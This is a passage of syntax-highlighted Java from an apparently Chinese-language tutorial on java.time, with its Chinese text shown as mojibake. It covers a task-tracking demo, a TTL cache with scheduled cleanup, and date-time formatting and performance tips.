    <span class="hljs-comment">// 3. ä»»åŠ¡ç®¡ç†ç³»ç»Ÿ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskManagementSystem</span> {
        
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> {
            String id;
            String title;
            String description;
            TaskPriority priority;
            LocalDateTime dueDate;
            Duration estimatedEffort;
            LocalDateTime actualStart;
            LocalDateTime actualEnd;
            TaskStatus status;
            
            <span class="hljs-keyword">enum</span> <span class="hljs-title class_">TaskPriority</span> { LOW, MEDIUM, HIGH, CRITICAL }
            <span class="hljs-keyword">enum</span> <span class="hljs-title class_">TaskStatus</span> { PENDING, IN_PROGRESS, BLOCKED, COMPLETED, CANCELLED }
            
            <span class="hljs-keyword">public</span> <span class="hljs-title function_">Task</span><span class="hljs-params">(String id, String title, String description, TaskPriority priority,
                       LocalDateTime dueDate, Duration estimatedEffort)</span> {
                <span class="hljs-built_in">this</span>.id = id;
                <span class="hljs-built_in">this</span>.title = title;
                <span class="hljs-built_in">this</span>.description = description;
                <span class="hljs-built_in">this</span>.priority = priority;
                <span class="hljs-built_in">this</span>.dueDate = dueDate;
                <span class="hljs-built_in">this</span>.estimatedEffort = estimatedEffort;
                <span class="hljs-built_in">this</span>.status = TaskStatus.PENDING;
            }
            
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startTask</span><span class="hljs-params">()</span> {
                <span class="hljs-built_in">this</span>.actualStart = LocalDateTime.now();
                <span class="hljs-built_in">this</span>.status = TaskStatus.IN_PROGRESS;
            }
            
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">completeTask</span><span class="hljs-params">()</span> {
                <span class="hljs-built_in">this</span>.actualEnd = LocalDateTime.now();
                <span class="hljs-built_in">this</span>.status = TaskStatus.COMPLETED;
            }
            
            <span class="hljs-keyword">public</span> Duration <span class="hljs-title function_">getTimeSpent</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (actualStart == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> Duration.ZERO;
                <span class="hljs-keyword">if</span> (actualEnd == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> Duration.between(actualStart, LocalDateTime.now());
                <span class="hljs-keyword">return</span> Duration.between(actualStart, actualEnd);
            }
            
            <span class="hljs-keyword">public</span> Duration <span class="hljs-title function_">getTimeRemaining</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (status == TaskStatus.COMPLETED) <span class="hljs-keyword">return</span> Duration.ZERO;
                
                <span class="hljs-type">Duration</span> <span class="hljs-variable">timeSpent</span> <span class="hljs-operator">=</span> getTimeSpent();
                <span class="hljs-keyword">if</span> (timeSpent.compareTo(estimatedEffort) &gt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">return</span> Duration.ZERO;
                }
                <span class="hljs-keyword">return</span> estimatedEffort.minus(timeSpent);
            }
            
            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOverdue</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> status != TaskStatus.COMPLETED &amp;&amp; 
                       LocalDateTime.now().isAfter(dueDate);
            }
            
            <span class="hljs-keyword">public</span> Duration <span class="hljs-title function_">getOverdueDuration</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (!isOverdue()) <span class="hljs-keyword">return</span> Duration.ZERO;
                <span class="hljs-keyword">return</span> Duration.between(dueDate, LocalDateTime.now());
            }
            
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProgress</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">if</span> (status == TaskStatus.PENDING) <span class="hljs-keyword">return</span> <span class="hljs-string">"0%"</span>;
                <span class="hljs-keyword">if</span> (status == TaskStatus.COMPLETED) <span class="hljs-keyword">return</span> <span class="hljs-string">"100%"</span>;
                
                <span class="hljs-keyword">if</span> (estimatedEffort.isZero()) <span class="hljs-keyword">return</span> <span class="hljs-string">"N/A"</span>;
                
                <span class="hljs-type">long</span> <span class="hljs-variable">spentMillis</span> <span class="hljs-operator">=</span> getTimeSpent().toMillis();
                <span class="hljs-type">long</span> <span class="hljs-variable">totalMillis</span> <span class="hljs-operator">=</span> estimatedEffort.toMillis();
                
                <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) spentMillis / totalMillis * <span class="hljs-number">100</span>;
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.1f%%"</span>, Math.min(<span class="hljs-number">100</span>, progress));
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm"</span>);
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"ä»»åŠ¡: %s [%s]\nä¼˜å…ˆçº§: %s\næˆªæ­¢æ—¶é—´: %s\né¢„ä¼°å·¥ä½œé‡: %s\nçŠ¶æ€: %s\nè¿›åº¦: %s\n%s"</span>,
                    title, id,
                    priority,
                    dueDate.format(formatter),
                    formatDuration(estimatedEffort),
                    status,
                    getProgress(),
                    isOverdue() ? <span class="hljs-string">"âš ï¸ å·²è¶…æœŸ "</span> + formatDuration(getOverdueDuration()) : <span class="hljs-string">"âœ“ æŒ‰æ—¶"</span>
                );
            }
            
            <span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatDuration</span><span class="hljs-params">(Duration duration)</span> {
                <span class="hljs-keyword">if</span> (duration.toDays() &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%då¤©%då°æ—¶"</span>, duration.toDays(), duration.toHoursPart());
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toHours() &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%då°æ—¶%dåˆ†é’Ÿ"</span>, duration.toHours(), duration.toMinutesPart());
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%dåˆ†é’Ÿ"</span>, duration.toMinutes());
                }
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">manageTasks</span><span class="hljs-params">()</span> {
            System.out.println(<span class="hljs-string">"\n=== ä»»åŠ¡ç®¡ç†ç³»ç»Ÿ ==="</span>);
            
            <span class="hljs-type">Task</span> <span class="hljs-variable">task1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>(
                <span class="hljs-string">"TASK-001"</span>,
                <span class="hljs-string">"å®ç°ç”¨æˆ·ç™»å½•åŠŸèƒ½"</span>,
                <span class="hljs-string">"å®ç°ç”¨æˆ·ç™»å½•ã€æ³¨å†Œã€å¿˜è®°å¯†ç åŠŸèƒ½"</span>,
                Task.TaskPriority.HIGH,
                LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">30</span>, <span class="hljs-number">18</span>, <span class="hljs-number">0</span>),
                Duration.ofHours(<span class="hljs-number">16</span>)
            );
            
            <span class="hljs-type">Task</span> <span class="hljs-variable">task2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>(
                <span class="hljs-string">"TASK-002"</span>,
                <span class="hljs-string">"ç¼–å†™å•å…ƒæµ‹è¯•"</span>,
                <span class="hljs-string">"ä¸ºæ ¸å¿ƒæ¨¡å—ç¼–å†™å•å…ƒæµ‹è¯•"</span>,
                Task.TaskPriority.MEDIUM,
                LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">18</span>, <span class="hljs-number">0</span>),
                Duration.ofHours(<span class="hljs-number">8</span>)
            );
            
            task1.startTask();
            task1.completeTask();
            
            task2.startTask();
            <span class="hljs-comment">// task2 æ­£åœ¨è¿›è¡Œä¸­</span>
            
            System.out.println(task1);
            System.out.println(<span class="hljs-string">"\n---\n"</span>);
            System.out.println(task2);
            
            <span class="hljs-comment">// ç”Ÿæˆä»»åŠ¡æŠ¥å‘Š</span>
            System.out.println(<span class="hljs-string">"\n=== ä»»åŠ¡æŠ¥å‘Š ==="</span>);
            List&lt;Task&gt; tasks = Arrays.asList(task1, task2);
            
            <span class="hljs-type">long</span> <span class="hljs-variable">totalEstimated</span> <span class="hljs-operator">=</span> tasks.stream()
                .mapToLong(t -&gt; t.estimatedEffort.toHours())
                .sum();
            
            <span class="hljs-type">long</span> <span class="hljs-variable">totalActual</span> <span class="hljs-operator">=</span> tasks.stream()
                .mapToLong(t -&gt; t.getTimeSpent().toHours())
                .sum();
            
            <span class="hljs-type">long</span> <span class="hljs-variable">overdueCount</span> <span class="hljs-operator">=</span> tasks.stream()
                .filter(Task::isOverdue)
                .count();
            
            System.out.printf(<span class="hljs-string">"æ€»ä»»åŠ¡æ•°: %d\n"</span>, tasks.size());
            System.out.printf(<span class="hljs-string">"é¢„ä¼°æ€»å·¥æ—¶: %d å°æ—¶\n"</span>, totalEstimated);
            System.out.printf(<span class="hljs-string">"å®é™…æ€»å·¥æ—¶: %d å°æ—¶\n"</span>, totalActual);
            System.out.printf(<span class="hljs-string">"è¶…æœŸä»»åŠ¡æ•°: %d\n"</span>, overdueCount);
            System.out.printf(<span class="hljs-string">"å®Œæˆç‡: %.1f%%\n"</span>, 
                tasks.stream().filter(t -&gt; t.status == Task.TaskStatus.COMPLETED).count() * <span class="hljs-number">100.0</span> / tasks.size());
        }
    }
    
    <span class="hljs-comment">// 4. ç¼“å­˜è¿‡æœŸç³»ç»Ÿ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheExpirySystem</span>&lt;K, V&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentHashMap&lt;K, CacheEntry&lt;V&gt;&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">cleaner</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);
        
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEntry</span>&lt;V&gt; {
            V value;
            Instant expiryTime;
            
            CacheEntry(V value, Duration ttl) {
                <span class="hljs-built_in">this</span>.value = value;
                <span class="hljs-built_in">this</span>.expiryTime = Instant.now().plus(ttl);
            }
            
            <span class="hljs-type">boolean</span> <span class="hljs-title function_">isExpired</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> Instant.now().isAfter(expiryTime);
            }
            
            Duration <span class="hljs-title function_">getTimeUntilExpiry</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> Duration.between(Instant.now(), expiryTime);
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">CacheExpirySystem</span><span class="hljs-params">()</span> {
            <span class="hljs-comment">// æ¯5ç§’æ¸…ç†ä¸€æ¬¡è¿‡æœŸç¼“å­˜</span>
            cleaner.scheduleAtFixedRate(<span class="hljs-built_in">this</span>::cleanExpiredEntries, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, TimeUnit.SECONDS);
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value, Duration ttl)</span> {
            cache.put(key, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEntry</span>&lt;&gt;(value, ttl));
        }
        
        <span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(K key)</span> {
            CacheEntry&lt;V&gt; entry = cache.get(key);
            <span class="hljs-keyword">if</span> (entry == <span class="hljs-literal">null</span> || entry.isExpired()) {
                cache.remove(key);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">return</span> entry.value;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(K key)</span> {
            cache.remove(key);
        }
        
        <span class="hljs-keyword">public</span> Set&lt;K&gt; <span class="hljs-title function_">getKeysAboutToExpire</span><span class="hljs-params">(Duration threshold)</span> {
            <span class="hljs-type">Instant</span> <span class="hljs-variable">warningTime</span> <span class="hljs-operator">=</span> Instant.now().plus(threshold);
            Set&lt;K&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (Map.Entry&lt;K, CacheEntry&lt;V&gt;&gt; entry : cache.entrySet()) {
                <span class="hljs-keyword">if</span> (entry.getValue().expiryTime.isBefore(warningTime)) {
                    result.add(entry.getKey());
                }
            }
            
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-keyword">public</span> Map&lt;K, Duration&gt; <span class="hljs-title function_">getExpiryTimes</span><span class="hljs-params">()</span> {
            Map&lt;K, Duration&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (Map.Entry&lt;K, CacheEntry&lt;V&gt;&gt; entry : cache.entrySet()) {
                result.put(entry.getKey(), entry.getValue().getTimeUntilExpiry());
            }
            
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanExpiredEntries</span><span class="hljs-params">()</span> {
            cache.entrySet().removeIf(entry -&gt; entry.getValue().isExpired());
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
            cleaner.shutdown();
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrate</span><span class="hljs-params">()</span> {
            System.out.println(<span class="hljs-string">"\n=== ç¼“å­˜è¿‡æœŸç³»ç»Ÿ ==="</span>);
            
            put(<span class="hljs-string">"user:1001"</span>, <span class="hljs-string">"ç”¨æˆ·æ•°æ®A"</span>, Duration.ofSeconds(<span class="hljs-number">30</span>));
            put(<span class="hljs-string">"product:2001"</span>, <span class="hljs-string">"äº§å“æ•°æ®B"</span>, Duration.ofMinutes(<span class="hljs-number">1</span>));
            put(<span class="hljs-string">"config:3001"</span>, <span class="hljs-string">"é…ç½®æ•°æ®C"</span>, Duration.ofHours(<span class="hljs-number">1</span>));
            
            System.out.println(<span class="hljs-string">"åˆå§‹ç¼“å­˜çŠ¶æ€:"</span>);
            getExpiryTimes().forEach((key, duration) -&gt; 
                System.out.printf(<span class="hljs-string">"  %s: %dç§’åè¿‡æœŸ%n"</span>, key, duration.getSeconds())
            );
            
            System.out.println(<span class="hljs-string">"\n30ç§’å†…å°†è¿‡æœŸçš„ç¼“å­˜:"</span>);
            getKeysAboutToExpire(Duration.ofSeconds(<span class="hljs-number">30</span>)).forEach(key -&gt;
                System.out.println(<span class="hljs-string">"  "</span> + key)
            );
            
            System.out.println(<span class="hljs-string">"\nç­‰å¾…35ç§’å..."</span>);
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">35000</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
            
            System.out.println(<span class="hljs-string">"\nå½“å‰ç¼“å­˜çŠ¶æ€:"</span>);
            getExpiryTimes().forEach((key, duration) -&gt; 
                System.out.printf(<span class="hljs-string">"  %s: %dç§’åè¿‡æœŸ%n"</span>, key, duration.getSeconds())
            );
            
            System.out.println(<span class="hljs-string">"\nè·å–user:1001: "</span> + get(<span class="hljs-string">"user:1001"</span>));
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è¿è¡Œå„ä¸ªç³»ç»Ÿ</span>
        FlightBookingSystem.bookFlight();
        MeetingScheduler.scheduleMeeting();
        TaskManagementSystem.manageTasks();
        
        CacheExpirySystem&lt;String, String&gt; cacheSystem = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheExpirySystem</span>&lt;&gt;();
        cacheSystem.demonstrate();
        cacheSystem.shutdown();
    }
}
</code></pre>
<h2 data-id="heading-18">æœ€ä½³å®è·µä¸æ€§èƒ½ä¼˜åŒ–</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;
<span class="hljs-keyword">import</span> java.util.concurrent.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeBestPractices</span> {
    
    <span class="hljs-comment">// 1. çº¿ç¨‹å®‰å…¨çš„æ—¥æœŸæ—¶é—´æ ¼å¼åŒ–</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeFormatter</span> {
        <span class="hljs-comment">// âŒ é”™è¯¯åšæ³•ï¼šSimpleDateFormatä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„</span>
        <span class="hljs-comment">// private static final SimpleDateFormat unsafeFormatter = new SimpleDateFormat("yyyy-MM-dd");</span>
        
        <span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•ï¼šDateTimeFormatteræ˜¯çº¿ç¨‹å®‰å…¨çš„</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">safeFormatter</span> <span class="hljs-operator">=</span> 
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, DateTimeFormatter&gt; formatterCache = 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DateTimeFormatter <span class="hljs-title function_">getFormatter</span><span class="hljs-params">(String pattern)</span> {
            <span class="hljs-keyword">return</span> formatterCache.computeIfAbsent(pattern, 
                p -&gt; DateTimeFormatter.ofPattern(p));
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">format</span><span class="hljs-params">(LocalDateTime dateTime, String pattern)</span> {
            <span class="hljs-keyword">return</span> dateTime.format(getFormatter(pattern));
        }
    }
    
    <span class="hljs-comment">// 2. æ—¥æœŸæ—¶é—´å¯¹è±¡æ± ï¼ˆé’ˆå¯¹é«˜é¢‘ç‡åˆ›å»ºåœºæ™¯ï¼‰</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimePool</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentLinkedQueue&lt;LocalDateTime&gt; pool = 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentLinkedQueue</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxSize;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">DateTimePool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> {
            <span class="hljs-built_in">this</span>.maxSize = maxSize;
        }
        
        <span class="hljs-keyword">public</span> LocalDateTime <span class="hljs-title function_">borrow</span><span class="hljs-params">()</span> {
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">dt</span> <span class="hljs-operator">=</span> pool.poll();
            <span class="hljs-keyword">return</span> dt != <span class="hljs-literal">null</span> ? dt : LocalDateTime.now();
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(LocalDateTime dateTime)</span> {
            <span class="hljs-keyword">if</span> (pool.size() &lt; maxSize) {
                pool.offer(dateTime);
            }
        }
    }
    
    <span class="hljs-comment">// 3. é«˜æ•ˆçš„æ—¶é—´æ¯”è¾ƒ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EfficientDateTimeComparison</span> {
        <span class="hljs-comment">// æ¯”è¾ƒä¸¤ä¸ªæ—¶é—´æ®µæ˜¯å¦é‡å </span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOverlap</span><span class="hljs-params">(LocalDateTime start1, LocalDateTime end1,
                                       LocalDateTime start2, LocalDateTime end2)</span> {
            <span class="hljs-comment">// ä½¿ç”¨æ—¶é—´æˆ³æ¯”è¾ƒï¼Œé¿å…å¤šæ¬¡æ–¹æ³•è°ƒç”¨</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> start1.atZone(ZoneId.systemDefault()).toInstant().toEpochMilli();
            <span class="hljs-type">long</span> <span class="hljs-variable">e1</span> <span class="hljs-operator">=</span> end1.atZone(ZoneId.systemDefault()).toInstant().toEpochMilli();
            <span class="hljs-type">long</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> start2.atZone(ZoneId.systemDefault()).toInstant().toEpochMilli();
            <span class="hljs-type">long</span> <span class="hljs-variable">e2</span> <span class="hljs-operator">=</span> end2.atZone(ZoneId.systemDefault()).toInstant().toEpochMilli();
            
            <span class="hljs-keyword">return</span> !(e1 &lt;= s2 || s1 &gt;= e2);
        }
        
        <span class="hljs-comment">// æ‰¹é‡æ£€æŸ¥æ—¥æœŸæ˜¯å¦åœ¨èŒƒå›´å†…</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;LocalDate&gt; <span class="hljs-title function_">filterDatesInRange</span><span class="hljs-params">(List&lt;LocalDate&gt; dates,
                                                        LocalDate start, 
                                                        LocalDate end)</span> {
            <span class="hljs-type">long</span> <span class="hljs-variable">startEpochDay</span> <span class="hljs-operator">=</span> start.toEpochDay();
            <span class="hljs-type">long</span> <span class="hljs-variable">endEpochDay</span> <span class="hljs-operator">=</span> end.toEpochDay();
            
            <span class="hljs-keyword">return</span> dates.stream()
                .filter(date -&gt; {
                    <span class="hljs-type">long</span> <span class="hljs-variable">epochDay</span> <span class="hljs-operator">=</span> date.toEpochDay();
                    <span class="hljs-keyword">return</span> epochDay &gt;= startEpochDay &amp;&amp; epochDay &lt;= endEpochDay;
                })
                .collect(Collectors.toList());
        }
    }
    
    <span class="hljs-comment">// 4. é¿å…å¸¸è§çš„æ€§èƒ½é™·é˜±</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformancePitfalls</span> {
        
        <span class="hljs-comment">// âŒ é”™è¯¯åšæ³•ï¼šåœ¨å¾ªç¯ä¸­é‡å¤åˆ›å»ºæ ¼å¼åŒ–å™¨</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badPractice</span><span class="hljs-params">(List&lt;LocalDateTime&gt; dateTimes)</span> {
            <span class="hljs-keyword">for</span> (LocalDateTime dt : dateTimes) {
                <span class="hljs-comment">// æ¯æ¬¡å¾ªç¯éƒ½åˆ›å»ºæ–°çš„æ ¼å¼åŒ–å™¨</span>
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
                <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> dt.format(formatter);
                <span class="hljs-comment">// ä½¿ç”¨ formatted...</span>
            }
        }
        
        <span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•ï¼šé‡ç”¨æ ¼å¼åŒ–å™¨</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">goodPractice</span><span class="hljs-params">(List&lt;LocalDateTime&gt; dateTimes)</span> {
            <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
            <span class="hljs-keyword">for</span> (LocalDateTime dt : dateTimes) {
                <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> dt.format(formatter);
                <span class="hljs-comment">// ä½¿ç”¨ formatted...</span>
            }
        }
        
        <span class="hljs-comment">// âŒ é”™è¯¯åšæ³•ï¼šä¸å¿…è¦çš„æ—¶åŒºè½¬æ¢</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badTimeZoneConversion</span><span class="hljs-params">()</span> {
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">localDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();
            <span class="hljs-comment">// ä¸å¿…è¦çš„åŒé‡è½¬æ¢</span>
            <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zoned</span> <span class="hljs-operator">=</span> localDateTime.atZone(ZoneId.systemDefault());
            <span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> zoned.toInstant();
            <span class="hljs-comment">// ...</span>
        }
        
        <span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•ï¼šç›´æ¥è½¬æ¢</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">goodTimeZoneConversion</span><span class="hljs-params">()</span> {
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">localDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();
            <span class="hljs-comment">// ç›´æ¥è½¬æ¢ä¸ºInstant</span>
            <span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> localDateTime.atZone(ZoneId.systemDefault()).toInstant();
            <span class="hljs-comment">// ...</span>
        }
    }
    
    <span class="hljs-comment">// 5. å†…å­˜ä¼˜åŒ–ï¼šä½¿ç”¨åŸå§‹ç±»å‹å¤„ç†æ—¶é—´æˆ³</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryOptimizedTimeSeries</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span>[] timestamps;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span>[] values;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MemoryOptimizedTimeSeries</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> {
            <span class="hljs-built_in">this</span>.timestamps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[capacity];
            <span class="hljs-built_in">this</span>.values = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[capacity];
            <span class="hljs-built_in">this</span>.size = <span class="hljs-number">0</span>;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDataPoint</span><span class="hljs-params">(LocalDateTime timestamp, <span class="hljs-type">double</span> value)</span> {
            <span class="hljs-keyword">if</span> (size &gt;= timestamps.length) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"å®¹é‡å·²æ»¡"</span>);
            }
            
            <span class="hljs-comment">// å­˜å‚¨æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span>
            timestamps[size] = timestamp.atZone(ZoneId.systemDefault())
                                        .toInstant()
                                        .toEpochMilli();
            values[size] = value;
            size++;
        }
        
        <span class="hljs-keyword">public</span> LocalDateTime <span class="hljs-title function_">getTimestamp</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> {
            <span class="hljs-keyword">return</span> LocalDateTime.ofInstant(
                Instant.ofEpochMilli(timestamps[index]),
                ZoneId.systemDefault()
            );
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getValue</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> {
            <span class="hljs-keyword">return</span> values[index];
        }
        
        <span class="hljs-comment">// é«˜æ•ˆçš„æ—¶é—´èŒƒå›´æŸ¥è¯¢</span>
        <span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title function_">queryByTimeRange</span><span class="hljs-params">(LocalDateTime start, LocalDateTime end)</span> {
            <span class="hljs-type">long</span> <span class="hljs-variable">startMillis</span> <span class="hljs-operator">=</span> start.atZone(ZoneId.systemDefault())
                                   .toInstant()
                                   .toEpochMilli();
            <span class="hljs-type">long</span> <span class="hljs-variable">endMillis</span> <span class="hljs-operator">=</span> end.atZone(ZoneId.systemDefault())
                               .toInstant()
                               .toEpochMilli();
            
            List&lt;Integer&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
